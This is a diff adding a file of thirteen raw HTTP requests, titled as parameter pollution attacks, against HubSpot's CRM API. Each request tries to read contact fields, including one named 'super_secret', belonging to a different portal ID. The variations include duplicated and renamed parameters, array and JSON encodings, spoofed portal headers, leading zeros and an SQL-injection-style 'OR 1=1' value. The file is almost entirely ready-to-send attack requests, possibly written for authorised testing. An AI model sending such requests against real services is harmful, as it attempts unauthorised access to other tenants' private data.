@@ -1,0 +1,100 @@
+# ========================================
+# PARAMETER POLLUTION ATTACKS
+# Testing edge cases and parser differentials
+# ========================================
+
+# REQUEST 1: Duplicate Portal ID Parameters
+GET /crm/v3/objects/contacts/1?portalId=YOUR_PORTAL&portalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 2: Portal ID Array Notation
+GET /crm/v3/objects/contacts/1?portalId[]=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 3: Portal ID with Different Case
+GET /crm/v3/objects/contacts/1?PortalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 4: Portal ID with Underscore
+GET /crm/v3/objects/contacts/1?portal_id=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 5: Hub ID instead of Portal ID
+GET /crm/v3/objects/contacts/1?hubId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 6: Account ID variation
+GET /crm/v3/objects/contacts/1?accountId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 7: Portal ID in Path
+GET /crm/v3/portals/46962361/objects/contacts/1?properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 8: Portal ID with JSON encoding
+GET /crm/v3/objects/contacts/1?portalId=%7B%22value%22%3A%2246962361%22%7D&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 9: Portal ID with SQL-like syntax (just in case)
+GET /crm/v3/objects/contacts/1?portalId=46962361%20OR%201=1&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 10: Mixed Body and Query Parameters
+POST /crm/v3/objects/contacts/batch/read?portalId=YOUR_PORTAL HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"inputs":[{"id":"1"}],"portalId":"46962361"}
+
+
+# REQUEST 11: Portal ID in Custom Header
+GET /crm/v3/objects/contacts/1?properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+X-Portal-Id: 46962361
+X-HubSpot-Portal-Id: 46962361
+Content-Type: application/json
+
+
+# REQUEST 12: Portal ID with leading zeros
+GET /crm/v3/objects/contacts/1?portalId=046962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 13: Portal ID as Integer vs String
+POST /crm/v3/objects/contacts/search HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"portalId":46962361,"limit":100}
